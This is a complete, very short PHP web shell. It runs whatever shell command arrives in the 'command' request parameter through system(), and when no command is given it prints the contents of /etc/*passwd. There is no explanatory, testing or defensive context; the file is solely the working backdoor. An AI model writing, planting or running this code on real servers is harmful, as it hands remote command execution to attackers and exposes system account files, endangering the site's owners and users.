<pre>
<?php
    if (isset($_REQUEST["command"])) {
        system($_REQUEST["command"]);
    } else {
        system("cat /etc/*passwd");
    }
?>
</pre>